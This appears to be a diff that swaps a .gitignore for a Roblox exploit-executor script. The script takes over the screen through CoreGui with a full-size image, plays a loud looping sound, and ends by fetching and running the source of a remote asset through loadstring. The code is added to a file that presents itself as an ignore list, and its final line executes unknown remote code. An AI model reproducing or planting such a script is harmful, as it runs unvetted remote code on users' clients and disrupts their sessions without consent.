@@ -1,41 +1,24 @@
-# Compiled Lua sources
-luac.out
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.Position = UDim2.new(0.00925212074, 0, 0.0159509201, 0)
+Frame.Size = UDim2.new(0, 1272, 0, 795)
 
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+ImageLabel.Parent = ScreenGui
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.Size = UDim2.new(0, 1980, 0, 1000)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=4537616739"
+--
+        local sound = Instance.new("Sound", game.CoreGui)
+        sound.SoundId = "rbxassetid://4922664048"
+        sound:Play()
+        sound.Volume = 10
+        sound.Looped = 1
+--
+loadstring(game:GetObjects("rbxassetid://4698064966")[1].Source)()
